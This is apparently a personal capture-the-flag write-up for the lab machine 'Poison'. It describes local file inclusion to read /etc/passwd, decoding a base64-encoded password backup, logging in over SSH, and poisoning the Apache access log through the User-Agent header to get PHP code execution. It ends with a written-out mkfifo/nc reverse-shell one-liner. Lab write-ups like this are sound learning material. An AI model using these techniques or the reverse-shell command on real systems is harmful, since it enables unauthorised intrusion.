
# Attack Surface

## Website

#### Method 1
![[Pasted image 20210408090619.png]]
- Here we can see some files that need to be tested.
- We can see from bros, there can be LFI in file parameter. Interestingly, there is also a file called pwdbackup.txt.
![[Pasted image 20210408090751.png]].
- Going to that file
![[Pasted image 20210408090841.png]]

- Copy that text and run `base64 -d` 13 times on it. We get a password.
- Use LFI to check for /etc/passwd
![[Pasted image 20210408090957.png]]
- The password most likely seems for charix. Using ssh, we can login as charix and cat out the user.txt
```bash
ssh charix@10.10.10.84
Password for charix@Poison:
Last login: Thu Apr  8 12:02:58 2021 from 10.10.14.15
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
To see the IP addresses currently set on your active interfaces, type
"ifconfig -u".
                -- Dru <genesis@istar.ca>
charix@Poison:~ % id ; ls
uid=1001(charix) gid=1001(charix) groups=1001(charix)
lin_log         linpeas.sh      secret          secret.zip      user.txt
charix@Poison:~ % 

```

#### Method 2 : Log Poisoning

- We can check through the file parameter, whether we can read the apache access logs. Quick google:
- ![[Pasted image 20210408103144.png]]
- We can change it to httpd-access.log
- We can make a requests by changing the User-Agent (using burp), as it is not being changed. We can test whether PHP code is being executed by trying.
	- `Hello`, `"Hello"`, `'Hello'`
- We can see that "Hello" is being escaped by backslashes, therefore we need to be sure to use single-quotes in the user-agent, or the PHP code might not execute
![[Pasted image 20210408135136.png]]
- We can get PHP code execution, by passing the desired command to sad parameter
- ![[Pasted image 20210408135323.png]]
- ![[Pasted image 20210408135309.png]]
- Use `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 9001 >/tmp/f` to get a revshell and we can use the same pwdbackup.txt to elevate privileges to charix